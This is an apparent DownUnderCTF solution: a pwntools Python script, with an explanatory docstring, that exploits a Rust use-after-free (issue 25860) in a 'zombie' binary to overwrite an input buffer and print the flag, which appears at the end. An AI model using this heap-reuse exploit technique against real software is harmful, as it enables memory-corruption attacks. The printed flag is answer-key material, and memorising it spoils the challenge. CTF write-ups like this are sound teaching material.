"""
We abuse https://github.com/rust-lang/rust/issues/25860, which in this case results in a 
use after free allowing us to edit a buffer that ends up being used in control flow.

Binary lets us allocate a buffer of arbitrary size ("infect"), edit it byte by byte (
"eat brains"), and view it byte by byte ("inspect brains", not used). There is also a
"get flag" option, but that gets filtered out by an early return. If only we could 
change the value of the input buffer...

Exploit procedes as follows:

1) Allocate a chunk of size 0x30. This gets immediately freed, though we still have a 
   reference.
2) Move into edit mode, but use a string with a lot of trailing zeroes. This causes the
   binary to need to allocate an 0x30 size chunk to hold it, and it will re-use the 
   just freed buffer above, allowing us to overwrite the line buffer with our edit
   ability.
3) Use the edit mode functionality to write the string "get flag  ". This overwrites the
   "eat brains" already there, which is why we need the trailing spaces.
4) "done" out of edit mode. The line buffer is then compared to "get flag", which passes,
   and the flag is printed

"""
from pwn import *

binary_path = "./zombie"

lib_path = "/lib/x86_64-linux-gnu/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

contextwatch execute "vis 30"

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
    .above(of="main", display="expressions", size="75%")
    .left(of="expressions", display="regs", size="35%")
    .above(of="regs", display="disasm")
    .above(of="disasm", display="stack")
).build(nobanner=True)
end

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chal.duc.tf 30008
        return remote("chal.duc.tf", 30008)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def breakpoint(io):
    if args.GDB:
        print("*** BREAKPOINT ***")
        io.interactive()


def infect(io, size):
    io.sendline("infect")
    io.sendline(f"{size}")


def write_data(io, data):
    for i, b in enumerate(data):
        io.sendline(f"{i}")
        io.sendline(f"{b}")

io = start()

infect(io, 0x28)

io.sendline("eat brains" + " "*20)
write_data(io, b"get flag  ")
io.sendline("done")

io.interactive()

# DUCTF{m3m0ry_s4f3ty_h4ck3d!}
